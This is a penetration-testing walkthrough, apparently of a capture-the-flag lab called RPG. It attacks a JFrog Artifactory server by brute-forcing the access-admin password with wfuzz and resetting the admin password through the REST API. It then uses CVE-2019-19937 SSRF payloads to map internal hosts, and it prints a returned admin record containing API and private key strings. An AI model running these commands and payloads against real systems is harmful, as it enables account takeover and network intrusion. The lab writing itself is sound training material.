---
description: Machines by MinatoTW and Keramas
---

# RPG

## Description:

Roundsoft Inc. is a startup with a mission to develop the best video games the world has ever seen.

Safeguarding the company's intellectual property from corporate espionage and other external threats is their highest priority. Roundsoft has enlisted the services of your pentesting company, with a scope to determine if their perimeter can be breached, leading to compromise of their entire domain.

RGP is designed to test your creative thinking, enumeration & exploitation skills within a small Active Directory environment.

The goal is to identify the company’s assets, enumerate and move laterally within the network, and ultimately to compromise the domain while collecting several flags along the way.

Entry Point: 10.13.38.18 and 10.13.38.19

### Would you like to play a game?



Lets start with nmap enumeration.

```text
nmap -p- --min-rate 1000 -sCV -oA ./nmap/18 10.13.38.18
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	|_http-title: Roundsoft Inc.
	3000/tcp open  ppp?
	| fingerprint-strings: 
	|   GetRequest, HTTPOptions:
	.....

nmap -p- -sCV -oA ./nmap/19 10.13.38.19
	PORT     STATE SERVICE VERSION
	80/tcp   open  http    Microsoft IIS httpd 10.0
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows Server
	8081/tcp open  http    Apache Tomcat 8.5.41
	| http-methods: 
	|_  Potentially risky methods: PUT DELETE
	|_http-title: Site doesn't have a title (text/html).
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We have two servers:   
An Ubuntu machine with SSH, Apache web on port 80 and [Rocket chat](https://rocket.chat/) on port 3000.  
A Windows machine with IIS on port 80 and Apache hosting [jFrog Artifactory](https://jfrog.com/artifactory/) on 8081.

Researching the named applications we'll find that jFrog has a password recovery mechanism using the [access-admin user](https://www.jfrog.com/confluence/display/RTF6X/Managing+Users#ManagingUsers-RecreatingtheDefaultAdminUser) for Artifactory versions above 6.8.  
When we access _10.13.38.19:8081_ we get redirected to _/artifactory/webapp/\#/login ._  
Reading the request headers we'll se that the Artifactory version is 6.13.1.

`Response Headers:  
Server: Artifactory/6.13.1  
X-Artifactory-Id: dcf029385834dbcc:5da73a7c:17c4a02fe85:-8000`

Next, we need to guess the password, looking at the API documentation, the [System Health Ping](https://www.jfrog.com/confluence/display/RTF6X/Artifactory+REST+API#ArtifactoryRESTAPI-SystemHealthPing) is a good candidate to fuzz. If we try a incorrect password we'll get an error response.

```text
curl -s -uaccess-admin:admin -XGET 'http://10.13.38.19:8081/access/a/api/v1/system/ping' -H 'Content-Type: application/json'
	{"errors":[{"code":"UNAUTHORIZED","detail":"Unauthorized","message":"HTTP 401 Unauthorized"}]}

wfuzz -c --basic 'access-admin:FUZZ' -w ./dict.txt -u 'http://10.13.38.19:8081/artifactory/api/v1/system/ping' -H 'Content-Type: application/json' --hc 401
	********************************************************
	* Wfuzz 3.1.0 - The Web Fuzzer                         *
	********************************************************

	Target: http://10.13.38.19:8081/artifactory/api/v1/system/ping
	Total requests: 100

	=====================================================================
	ID           Response   Lines    Word       Chars       Payload                                 
	=====================================================================

	000000013:   404        5 L      15 W       79 Ch       "Password12"                            

```

With the password we can change the admin password:

```text
curl -s -uaccess-admin:Password12 -XPATCH 'http://10.13.38.19:8081/artifactory/api/access/api/v1/users/admin' -H 'Content-Type: application/json' -d '{"password":"newAdminPassword"}'
	{
	  "username" : "admin",
	  "email" : "jfrog-admin@roundsoft.local",
	  "realm" : "internal",
	  "status" : "enabled",
	  "allowed_ips" : [ "*" ],
	  "created" : "2019-11-16T17:25:13.904-08:00",
	  "modified" : "2021-10-07T09:19:48.241-07:00",
	  "last_login_time" : "2020-06-14T23:53:36.039-07:00",
	  "last_login_ip" : "10.10.14.9",
	  "custom_data" : {
	    "public_key" : "JUHfDLxBPMe4YZbWLKdbams2ZTPq3rmG1zxgTFhrFQEh8fUTDWfNMxDka1ipqdZwGLZY6dhmWpZrYfefNiSQRMYGCidZs6YJEEwAgAJ4nEbyYE9KybxXWsSuHJ2VB1xpwsf1P",
	    "apiKey_shash" : "CVH6pG",
	    "apiKey" : "AKCp5e31BNLmPhjFrkk6oPKecoKcypYtxSY9QrMvDSHMWVgghVLFqfdpENgSfzQRqZsJmg1Pm",
	    "updatable_profile" : "true",
	    "private_key" : "JR5cohej8r9cKXYVgnxhLowKuQWaX4AjMQYxt2Up6AADGw6eaUkqfh3wRnPHTuC1cEeF24i1uwKQa4a8QH4G7QVLyGw2Ao5CAMSo451bu99myYXzbXhguUN9JnDwKVymHDws3JXHZ4iprQKzfdt79KJmNXCvJ6syqvBzoXNKxqCm8pYXhLBHDSGHu2AXbjmzGa8idkteMPXqvq9XqRNuiP8aUCPUQFUsSjic4LxRoQQtDBNjmjFGcbGLK7Gx9XotVBRyvB3pjcFxNJHA7KmTzy19qx1wa5YfEM2TmN48h8qxnpyqS9tZpQ84vr4VWXKnhok8XFPEaB5PbxHxhUTXcXnfumPYm1MDQtyp6zXQzxUB3PfGXMfF9LHvGwzwXH1mLZv3d2R2B5NwUU8RpQ3A2fXV6fvstkeyfqzprZmeqC2o9zHSc75KYQEhHqcoK8b9Yn1dcKbAdmevkAGQpjpfd8a8",
	    "artifactory_admin" : "true"
	  },
	  "password_expired" : false,
	  "password_last_modified" : 1633623588241,
	  "groups" : [ ]
	}
```

Once logged in, we can use the [System logs](http://10.13.38.19:8081/artifactory/webapp/#/admin/advanced/system_logs) and the [Security descriptor](http://10.13.38.19:8081/artifactory/webapp/#/admin/advanced/security_descriptor) to view connections from local machines with what looks like `192.168.125.0/24` IP range.  
Searching for Artifactory CVEs we get  [CVE-2019-19937](https://www.cvedetails.com/cve/CVE-2019-19937/), this leads to this [post](https://keramas.github.io/2020/04/03/jfrog-ssrf-vulnerability.html) by one of the creators of the endgame explaining a vulnerability in the _**Import Repository from Path**_ functionality of Artifactory.  
This allows to discover live host by they response time, once found, we can use a wordlist to try to recover a useful repository.

Using BURP Intruder we first fuzz the last IP range.  
`{"action":"repository","repository":"FightingFantasy_Beta","path":"\\192.168.125.§1§\repo","excludeMetadata":false,"verbose":false}`  
The responsive hosts are: `192.168.125.88` , `192.168.125.128` and `192.168.125.129`.  
Then using a wordlist with common repository names \(alpha, beta, development, buid...\) we can use Intruder again to discover repositories.

`{"action":"repository","repository":"FightingFantasy_Beta","path":"\\192.168.125.129\§repo§","excludeMetadata":false,"verbose":false}`



